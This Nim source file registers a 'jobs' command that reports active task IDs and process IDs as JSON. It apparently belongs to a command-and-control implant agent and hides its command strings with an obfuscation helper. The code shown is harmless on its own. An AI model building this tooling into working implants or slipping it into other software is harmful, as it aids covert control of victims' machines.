import std/[json, strutils]
import core/types
import core/jobs
import commands/registry
import crypto/strenc

proc jobsExecute(taskId: string, params: JsonNode, state: AgentState,
                 send: SendMsg): TaskResult =
  let active = jobActiveList()
  let jobsArr = newJArray()
  for tid in active:
    let pid = jobPid(tid)
    var entry = newJObject()
    entry[hidstr("task_id")] = %tid
    entry["pid"] = %pid
    jobsArr.add(entry)
  var res = newJObject()
  res["jobs"] = jobsArr
  return TaskResult(output: $res, status: "success", completed: true)

proc initJobs*() =
  register(hidstr("jobs"), jobsExecute)
